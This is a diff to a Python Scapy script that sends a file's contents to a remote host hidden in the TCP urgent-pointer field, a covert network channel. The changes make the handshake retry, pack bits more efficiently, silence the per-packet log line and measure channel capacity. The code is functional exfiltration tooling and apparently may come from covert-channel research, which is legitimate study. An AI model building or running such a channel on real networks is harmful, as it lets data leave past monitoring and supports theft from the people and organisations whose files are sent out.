@@ -14,32 +14,58 @@ def encrypt_data(data):
     return f.encrypt(data)
 
 def perform_handshake(ip_dst, sport, dport):
-    """Perform a TCP three-way handshake"""
+    """Perform a TCP three-way handshake with resilience to RA packets"""
     print(f"Initiating TCP handshake with {ip_dst}:{dport}...")
     
     # Generate initial sequence number
     seq = random.randint(1000, 9000)
     
-    # SYN
-    ip = IP(dst=ip_dst)
-    syn = TCP(sport=sport, dport=dport, flags="S", seq=seq)
-    syn_ack = sr1(ip/syn, timeout=3, verbose=0, retry=3)
+    # Set maximum attempts for the handshake
+    max_attempts = 5
+    attempt = 0
     
-    if not syn_ack:
-        print("No response to SYN packet. Target may be unreachable.")
-        return None, None
+    while attempt < max_attempts:
+        attempt += 1
+        
+        # SYN
+        ip = IP(dst=ip_dst)
+        syn = TCP(sport=sport, dport=dport, flags="S", seq=seq)
+        
+        # Send SYN and wait for response
+        syn_ack = sr1(ip/syn, timeout=3, verbose=0)
+        
+        if not syn_ack:
+            print(f"No response to SYN packet (attempt {attempt}/{max_attempts}). Retrying...")
+            time.sleep(1)
+            continue
+        
+        # Check if this is an RA (Reset-Ack) packet
+        if syn_ack.haslayer(TCP) and (syn_ack[TCP].flags & 0x14) == 0x14:  # 0x14 = Reset(0x04) + Ack(0x10)
+            print(f"Received Reset-Ack packet (attempt {attempt}/{max_attempts}), trying again...")
+            time.sleep(1)
+            continue
+            
+        # Check if this is a proper SYN-ACK response
+        if syn_ack.haslayer(TCP) and (syn_ack[TCP].flags & 0x12) == 0x12:  # 0x12 = SYN(0x02) + ACK(0x10)
+            # Validate source
+            if syn_ack[IP].src != ip_dst or syn_ack[TCP].dport != sport:
+                print(f"Response from unexpected source (attempt {attempt}/{max_attempts}), retrying...")
+                time.sleep(1)
+                continue
+                
+            # Send ACK to complete handshake
+            ack = TCP(sport=sport, dport=dport, flags="A", 
+                      seq=seq+1, ack=syn_ack[TCP].seq+1)
+            send(ip/ack, verbose=0)
+            
+            print("TCP handshake completed successfully.")
+            return seq+1, syn_ack[TCP].seq+1
+        else:
+            print(f"Received unexpected response with flags: {syn_ack[TCP].flags:02x} (attempt {attempt}/{max_attempts})")
+            time.sleep(1)
     
-    if not syn_ack.haslayer(TCP) or not (syn_ack[TCP].flags & 0x12):  # Check for SYN-ACK flags
-        print(f"Improper response received during handshake. Flags: {syn_ack[TCP].flags}")
-        return None, None
-    
-    # ACK
-    ack = TCP(sport=sport, dport=dport, flags="A", 
-              seq=seq+1, ack=syn_ack[TCP].seq+1)
-    send(ip/ack, verbose=0)
-    
-    print("TCP handshake completed successfully.")
-    return seq+1, syn_ack[TCP].seq+1
+    print(f"Handshake failed after {max_attempts} attempts.")
+    return None, None
 
 def tcp_sender(file_path, interval, bits_to_use=16, use_encryption=False):
 
@@ -78,22 +104,33 @@ def tcp_sender(file_path, interval, bits_to_use=16, use_encryption=False):
     chunks = []
     mask = max_value
     
-    # If bits_to_use is 8 or less, we process 1 byte at a time
-    if bits_to_use <= 8:
-        for byte in data:
-            chunks.append(byte & mask)
-    else:
-        # For more than 8 bits, we process 2 bytes at a time
-        for i in range(0, len(data), 2):
-            if i + 1 < len(data):
-                value = (data[i] << 8) | data[i+1]
-            else:
-                # Pad with zero if we have an odd number of bytes
-                value = (data[i] << 8)
-            chunks.append(value & mask)
+    # Special handling for bit counts that don't align with bytes
+    bit_buffer = 0
+    bit_count = 0
     
+    # Process all bytes
+    for byte in data:
+        # Add this byte to the bit buffer
+        bit_buffer = (bit_buffer << 8) | byte
+        bit_count += 8
+        
+        # Extract chunks when we have enough bits
+        while bit_count >= bits_to_use:
+            bit_count -= bits_to_use
+            value = (bit_buffer >> bit_count) & mask
+            chunks.append(value)
+    
+    # Handle any remaining bits
+    if bit_count > 0:
+        # Pad with zeros
+        value = (bit_buffer << (bits_to_use - bit_count)) & mask
+        chunks.append(value)
+
     # Use random values for sport
     sport = random.randint(1024, 65535)
+    
+    # Add timing markers
+    start_time = time.time()
     
     # Perform TCP handshake
     seq, ack = perform_handshake(host, sport, port)
@@ -106,12 +143,12 @@ def tcp_sender(file_path, interval, bits_to_use=16, use_encryption=False):
     
     # Send data chunks
     for i, value in enumerate(chunks):
-        tcp = TCP(sport=sport, dport=port, flags="U", seq=seq, ack=ack)
+        tcp = TCP(sport=sport, dport=port, flags="UA", seq=seq, ack=ack)
         tcp.urgptr = value  # Encode data in the URG pointer
         pkt = ip/tcp/"X"  # Dummy payload
         
         send(pkt, verbose=0)
-        print(f"Sent chunk {i+1}/{len(chunks)}: URG={value} (0x{value:04X})")
+        #print(f"Sent chunk {i+1}/{len(chunks)}: URG={value} (0x{value:04X})")
         
         # Increase sequence number for next packet
         seq += len(pkt[TCP].payload)
@@ -119,19 +156,18 @@ def tcp_sender(file_path, interval, bits_to_use=16, use_encryption=False):
         # Wait between packets
         time.sleep(interval)
     
+    # End timing marker
+    end_time = time.time()
+    transmission_time = end_time - start_time
+
     # Send marker packet to indicate transmission complete
-    end_marker = TCP(sport=sport, dport=port, flags="FA", seq=seq, ack=ack)
-    send(ip/end_marker, verbose=0)
+    print("Sending FIN to signal transmission complete...")
+    fin = TCP(sport=sport, dport=port, flags="FA", seq=seq, ack=ack)
+    send(ip/fin, verbose=0)
+
     print(f"Successfully sent {len(data)} bytes using TCP URG covert channel.")
-    
-    # Send FIN to close connection properly
-    fin = TCP(sport=sport, dport=port, flags="F", seq=seq+1, ack=ack)
-    fin_ack = sr1(ip/fin, timeout=2, verbose=0)
-    if fin_ack and fin_ack.haslayer(TCP):
-        # Send final ACK
-        last_ack = TCP(sport=sport, dport=port, flags="A", seq=seq+2, ack=fin_ack[TCP].seq+1)
-        send(ip/last_ack, verbose=0)
-    print("Connection closed.")
+    print(f"Transmission time: {transmission_time:.2f} seconds")
+    print(f"Estimated capacity: {(len(data) * 8) / transmission_time:.2f} bits/second")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Covert channel sender using TCP URG pointer")
